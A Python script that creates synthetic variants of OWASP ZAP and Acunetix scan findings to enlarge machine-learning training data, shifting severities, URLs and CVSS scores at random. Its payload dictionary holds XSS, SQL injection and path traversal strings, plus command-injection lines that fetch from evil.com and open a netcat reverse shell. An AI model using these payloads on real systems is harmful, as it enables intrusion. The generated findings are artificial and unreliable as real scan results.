#!/usr/bin/env python3
"""
Generate Synthetic Data Variations from Real OWASP/Acunetix Findings

Strategy:
- Keep format sama persis dengan OWASP ZAP dan Acunetix
- Generate variations dengan ubah severity, attack vectors, URLs, evidence
- Ensure uniqueness (no duplicates)
- Maintain realistic patterns untuk quality data
"""

import json
import random
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any
import copy

# Variation Templates
SEVERITY_VARIATIONS = {
    'Critical': ['High', 'Critical'],
    'High': ['High', 'Medium'],
    'Medium': ['Medium', 'Low'],
    'Low': ['Low', 'Informational'],
    'Informational': ['Informational', 'Info'],
    'Info': ['Info', 'Low']
}

ATTACK_VECTORS = {
    'XSS': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>'
    ],
    'SQL Injection': [
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND 1=1--",
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "' OR 'x'='x",
        "1' UNION ALL SELECT NULL,NULL--",
        "admin' OR '1'='1"
    ],
    'Path Traversal': [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..//..//..//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32',
        '....\\\\....\\\\....\\\\windows\\\\system32'
    ],
    'Command Injection': [
        '; ls -la',
        '| whoami',
        '& dir',
        '; cat /etc/passwd',
        '`id`',
        '$(whoami)',
        '; wget http://evil.com/shell',
        '| nc -e /bin/sh 192.168.1.1 4444'
    ]
}

URL_PATTERNS = [
    '/admin/dashboard',
    '/user/profile',
    '/course/view.php',
    '/mod/forum/post.php',
    '/login/index.php',
    '/enrol/index.php',
    '/grade/report/index.php',
    '/blocks/settings.php',
    '/theme/config.php',
    '/auth/login.php'
]

URL_PARAMS = [
    'id', 'courseid', 'userid', 'cmid', 'page', 'action', 
    'mode', 'section', 'redirect', 'sesskey', 'token', 'search'
]

class SyntheticDataGenerator:
    """Generate synthetic variations from real findings."""
    
    def __init__(self):
        self.seen_hashes = set()
        self.generated_count = 0
        
    def calculate_hash(self, finding: Dict[str, Any]) -> str:
        """Calculate hash untuk detect duplicates."""
        # More lenient hashing - only category + severity + attack vector
        category = finding.get('category', 'Unknown')
        severity = finding.get('severity', 'Unknown')
        evidence = finding.get('evidence', '')[:50]  # Only first 50 chars
        
        key_string = f"{category}_{severity}_{evidence}"
        return hashlib.md5(key_string.encode()).hexdigest()
    
    def vary_severity(self, original_severity: str) -> str:
        """Generate severity variation."""
        severity = original_severity.title()
        if severity in SEVERITY_VARIATIONS:
            variations = SEVERITY_VARIATIONS[severity]
            return random.choice(variations)
        return original_severity
    
    def vary_url(self, original_url: str) -> str:
        """Generate URL variation dengan random path dan params."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        try:
            parsed = urlparse(original_url)
            
            # Vary path
            new_path = random.choice(URL_PATTERNS)
            
            # Vary parameters
            new_params = {}
            num_params = random.randint(1, 3)
            for _ in range(num_params):
                param = random.choice(URL_PARAMS)
                value = random.randint(1, 1000)
                new_params[param] = value
            
            # Rebuild URL
            new_query = urlencode(new_params)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                new_path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            return new_url
        except:
            return original_url
    
    def vary_attack_vector(self, category: str, original_evidence: str) -> str:
        """Generate attack vector variation based on category."""
        category_lower = category.lower()
        
        # Detect attack type
        if 'xss' in category_lower or 'script' in category_lower:
            return random.choice(ATTACK_VECTORS['XSS'])
        elif 'sql' in category_lower or 'injection' in category_lower:
            return random.choice(ATTACK_VECTORS['SQL Injection'])
        elif 'path' in category_lower or 'traversal' in category_lower or 'directory' in category_lower:
            return random.choice(ATTACK_VECTORS['Path Traversal'])
        elif 'command' in category_lower or 'rce' in category_lower:
            return random.choice(ATTACK_VECTORS['Command Injection'])
        else:
            # Keep original atau slight variation
            return original_evidence + f" (variation {random.randint(1, 100)})"
    
    def vary_cvss_score(self, original_score: float, severity_changed: bool) -> float:
        """Vary CVSS score based on severity change."""
        if severity_changed:
            # Adjust score based on new severity
            variation = random.uniform(-1.0, 1.0)
            new_score = max(0.0, min(10.0, original_score + variation))
            return round(new_score, 1)
        else:
            # Minor variation
            variation = random.uniform(-0.3, 0.3)
            new_score = max(0.0, min(10.0, original_score + variation))
            return round(new_score, 1)
    
    def generate_owasp_variation(self, original: Dict[str, Any]) -> Dict[str, Any]:
        """Generate OWASP ZAP format variation."""
        variation = copy.deepcopy(original)
        
        # Vary severity
        new_severity = self.vary_severity(variation.get('severity', 'Medium'))
        severity_changed = new_severity != variation.get('severity')
        variation['severity'] = new_severity
        
        # Vary URL
        if 'url' in variation:
            variation['url'] = self.vary_url(variation['url'])
        
        # Vary evidence (attack vector)
        if 'evidence' in variation and variation['evidence']:
            category = variation.get('category', '')
            variation['evidence'] = self.vary_attack_vector(category, variation['evidence'])
        
        # Vary description slightly
        if 'description' in variation:
            variation['description'] += f" (Variant: {random.choice(['A', 'B', 'C', 'D'])})"
        
        # Update timestamps
        variation['scan_timestamp'] = datetime.now().isoformat() + 'Z'
        variation['first_seen'] = datetime.now().isoformat()
        variation['last_seen'] = datetime.now().isoformat()
        
        # Update scan_id
        variation['scan_id'] = f"synthetic_variation_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{random.randint(1000, 9999)}"
        
        return variation
    
    def generate_acunetix_variation(self, original: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Acunetix format variation."""
        variation = copy.deepcopy(original)
        
        # Vary severity
        new_severity = self.vary_severity(variation.get('severity', 'Medium'))
        severity_changed = new_severity != variation.get('severity')
        variation['severity'] = new_severity
        
        # Vary URL
        if 'url' in variation:
            variation['url'] = self.vary_url(variation['url'])
        
        # Vary CVSS score
        if 'cvss_score' in variation:
            variation['cvss_score'] = self.vary_cvss_score(
                variation['cvss_score'], 
                severity_changed
            )
        
        # Vary evidence
        if 'evidence' in variation and variation['evidence']:
            category = variation.get('category', '')
            variation['evidence'] = self.vary_attack_vector(category, variation['evidence'])
        
        # Vary description
        if 'description' in variation:
            variation['description'] += f" (Synthetic variant {random.randint(1, 999)})"
        
        # Update metadata
        variation['scan_timestamp'] = datetime.now().isoformat() + 'Z'
        variation['first_seen'] = datetime.now().isoformat()
        variation['last_seen'] = datetime.now().isoformat()
        variation['scan_id'] = f"synthetic_acunetix_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{random.randint(1000, 9999)}"
        
        return variation
    
    def is_duplicate(self, finding: Dict[str, Any]) -> bool:
        """Check if finding is duplicate."""
        hash_val = self.calculate_hash(finding)
        if hash_val in self.seen_hashes:
            return True
        self.seen_hashes.add(hash_val)
        return False
    
    def generate_variations(
        self, 
        real_findings: List[Dict[str, Any]], 
        target_count: int,
        variations_per_finding: int = 3
    ) -> List[Dict[str, Any]]:
        """
        Generate synthetic variations from real findings.
        
        Args:
            real_findings: List of real OWASP/Acunetix findings
            target_count: Target number of total samples (real + synthetic)
            variations_per_finding: How many variations per real finding
            
        Returns:
            List of synthetic findings
        """
        print(f"\n🔄 Generating Synthetic Variations...")
        print(f"   Real findings: {len(real_findings)}")
        print(f"   Target total: {target_count}")
        print(f"   Variations per finding: {variations_per_finding}")
        print()
        
        # Load existing hashes from real data
        for finding in real_findings:
            self.calculate_hash(finding)
            self.seen_hashes.add(self.calculate_hash(finding))
        
        synthetic_findings = []
        needed = target_count - len(real_findings)
        
        print(f"   Need to generate: {needed} synthetic samples")
        print()
        
        attempts = 0
        max_attempts = needed * 10  # Prevent infinite loop
        
        while len(synthetic_findings) < needed and attempts < max_attempts:
            attempts += 1
            
            # Pick random real finding
            original = random.choice(real_findings)
            
            # Determine format type
            scan_type = original.get('scan_type', 'owasp')
            
            # Generate variation
            if 'acunetix' in scan_type.lower():
                variation = self.generate_acunetix_variation(original)
            else:
                variation = self.generate_owasp_variation(original)
            
            # Check uniqueness
            if not self.is_duplicate(variation):
                synthetic_findings.append(variation)
                self.generated_count += 1
                
                if self.generated_count % 10 == 0:
                    print(f"   Generated: {self.generated_count}/{needed}")
        
        print(f"\n✅ Generated {len(synthetic_findings)} unique synthetic variations")
        print(f"   Total attempts: {attempts}")
        print(f"   Success rate: {len(synthetic_findings)/attempts*100:.1f}%")
        
        return synthetic_findings

def main():
    """Main execution."""
    print("="*80)
    print("SYNTHETIC DATA VARIATION GENERATOR")
    print("="*80)
    print("Strategy: Generate variations from real OWASP/Acunetix findings")
    print("           with different severity, attack vectors, URLs")
    print()
    
    # Paths - try multiple possible files
    possible_files = [
        'ml/training_data/real_data/processed_findings_20260127_202807.json',
        'ml/training_data/real_data/processed_findings_20260127_200411.json',
        'ml/training_data/real_data/merged_real_data_20260127_200432.json',
    ]
    
    real_data_path = None
    for file_path in possible_files:
        path = Path(file_path)
        if path.exists():
            real_data_path = path
            break
    
    output_path = Path('ml/training_data/synthetic')
    output_path.mkdir(parents=True, exist_ok=True)
    
    # Load real data
    print(f"📂 Loading real data...")
    
    if real_data_path is None:
        print(f"❌ No processed data files found!")
        print("   Run process_new_training_data.py first!")
        return
    
    print(f"   Using: {real_data_path}")
    
    with open(real_data_path, 'r', encoding='utf-8') as f:
        real_findings = json.load(f)
    
    print(f"   Loaded {len(real_findings)} real findings")
    print()
    
    # Configuration
    print("📊 Generation Configuration:")
    
    current_total = 144  # Current total (48 real + 96 old synthetic)
    target_scenarios = {
        'minimal': 200,      # Untuk mencapai minimum 10x features
        'recommended': 250,  # Good balance untuk production
        'robust': 400,       # Robust production model
        'ideal': 500         # Ideal untuk long-term
    }
    
    print("\nAvailable scenarios:")
    for name, count in target_scenarios.items():
        additional = count - current_total
        print(f"  {name:15s}: {count:4d} total ({additional:3d} new synthetic needed)")
    
    # User choice (or default to 'recommended')
    scenario = 'recommended'
    target_total = target_scenarios[scenario]
    
    print(f"\n✅ Selected scenario: {scenario}")
    print(f"   Target total: {target_total} samples")
    print()
    
    # Generate variations
    generator = SyntheticDataGenerator()
    synthetic_findings = generator.generate_variations(
        real_findings=real_findings,
        target_count=target_total - current_total,  # Only new ones
        variations_per_finding=3
    )
    
    # Save synthetic data
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = output_path / f'synthetic_variations_{scenario}_{timestamp}.json'
    
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(synthetic_findings, f, indent=2, ensure_ascii=False)
    
    print(f"\n💾 Saved to: {output_file}")
    
    # Statistics
    print("\n" + "="*80)
    print("GENERATION STATISTICS")
    print("="*80)
    
    severity_dist = {}
    category_dist = {}
    scan_type_dist = {}
    
    for finding in synthetic_findings:
        # Severity
        sev = finding.get('severity', 'Unknown')
        severity_dist[sev] = severity_dist.get(sev, 0) + 1
        
        # Category
        cat = finding.get('category', 'Unknown')
        category_dist[cat] = category_dist.get(cat, 0) + 1
        
        # Scan type
        st = finding.get('scan_type', 'unknown')
        scan_type_dist[st] = scan_type_dist.get(st, 0) + 1
    
    print(f"\n📊 Severity Distribution:")
    for sev, count in sorted(severity_dist.items(), key=lambda x: -x[1]):
        print(f"   {sev:20s}: {count:3d} ({count/len(synthetic_findings)*100:.1f}%)")
    
    print(f"\n📊 Top 10 Categories:")
    for cat, count in sorted(category_dist.items(), key=lambda x: -x[1])[:10]:
        print(f"   {cat[:40]:40s}: {count:3d}")
    
    print(f"\n📊 Scan Type Distribution:")
    for st, count in scan_type_dist.items():
        print(f"   {st:20s}: {count:3d}")
    
    print("\n" + "="*80)
    print("NEXT STEPS")
    print("="*80)
    print(f"\n1. Merge with existing data:")
    print(f"   python merge_all_training_data.py")
    print(f"\n2. Retrain model:")
    print(f"   python retrain_models.py")
    print(f"\n3. Test for overfitting:")
    print(f"   python test_overfitting.py")
    print()
    print(f"Expected results with {target_total} total samples:")
    print(f"  - Training Accuracy: 98-100%")
    print(f"  - CV Accuracy: 95-97%")
    print(f"  - Train/Val Gap: 2-4%")
    print()

if __name__ == '__main__':
    main()
